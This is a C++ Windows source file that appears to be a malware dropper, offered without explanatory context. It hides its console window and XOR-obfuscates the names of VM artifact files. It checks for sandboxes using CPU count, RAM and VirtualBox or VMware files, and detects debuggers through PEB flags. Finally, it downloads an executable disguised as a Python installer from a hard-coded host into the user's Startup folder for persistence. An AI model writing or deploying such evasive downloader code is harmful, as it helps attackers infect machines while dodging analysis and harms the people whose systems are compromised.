#include <ShlObj.h>
#include <Windows.h>
#include <iostream>
#include <urlmon.h>
#include <tchar.h>
#include <thread>
#include <chrono>

#pragma comment (lib, "Shlwapi.lib")
#pragma comment (lib, "urlmon.lib")

#include "Encrypted.h"

void Stealth() {
	HWND hwnd;
	AllocConsole();
	hwnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hwnd, NULL);
}

void TimedExecution(unsigned duration) {
	std::this_thread::sleep_for(std::chrono::seconds(duration));
}

void XORString(CHAR* string) {
	for (int i = 0; i < strlen(string); i++)
	{
	string[i] = string[i] ^ 0x09;
	}
}

void XORString(WCHAR* string) {
	for (int i = 0; i < wcslen(string); i++)
	{
		string[i] = string[i] ^ 0x09;
	}
}

void DecryptNames() {
	XORString(nameVBoxFile);
	XORString(nameVMwareFile);
}

bool CheckCPU() {
	SYSTEM_INFO systemInfo;
	DWORD numberOfProcessors;

	GetSystemInfo(&systemInfo);
	numberOfProcessors = systemInfo.dwNumberOfProcessors;

	if (numberOfProcessors < 4) return true;
	else return false;
}

bool CheckRAM() {
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	DWORD RAMMegaBytes;

	GlobalMemoryStatusEx(&memoryStatus);
	RAMMegaBytes = memoryStatus.ullTotalPhys / 1024 / 1024;

	if (RAMMegaBytes < 4096) return true;
	else return false;
}

bool CheckVMFiles() {
	WIN32_FIND_DATAA findFileData;
	bool anyFileExists;

	HANDLE findFileHandle1 = FindFirstFileA(nameVBoxFile, &findFileData);
	HANDLE findFileHandle2 = FindFirstFileA(nameVMwareFile, &findFileData);
	anyFileExists = (findFileHandle1 != INVALID_HANDLE_VALUE || findFileHandle2 != INVALID_HANDLE_VALUE);

	if (anyFileExists) return true;
	else return false;
}

bool Sandboxed() {
	if (CheckCPU() || CheckRAM() || CheckVMFiles()) return true;
	else return false;
}

bool Debugged() {
	byte beingDebugged;
	byte ntGlobalFlag;

	PBYTE pPEB = (PBYTE)__readgsqword(0x60);
	beingDebugged = *(pPEB + 0x2);
	ntGlobalFlag = *(pPEB + 0xBC);

	if (beingDebugged || ntGlobalFlag == 0x70) return true;
	else return false;
}

std::wstring GetStartupFolder() {
	PWSTR pszPath = NULL;
	HRESULT hr = SHGetKnownFolderPath(FOLDERID_Startup, NULL, NULL, &pszPath);

	if (SUCCEEDED(hr)) {
		return pszPath;
	}
}

void DownloadFile(std::wstring StartupFolder) {
	const wchar_t* sourceURL = _T("http://192.168.100.1:8080/python-3.6.2.exe");
	wchar_t* destinationFile = _wcsdup(StartupFolder.c_str());

	if (S_OK == URLDownloadToFile(NULL, sourceURL, destinationFile, NULL, NULL)) {
		std::cout << "[+] Download successful\n";
	}
	else {
		std::cout << "[!] Download failed\n";
	}

	free(destinationFile);
}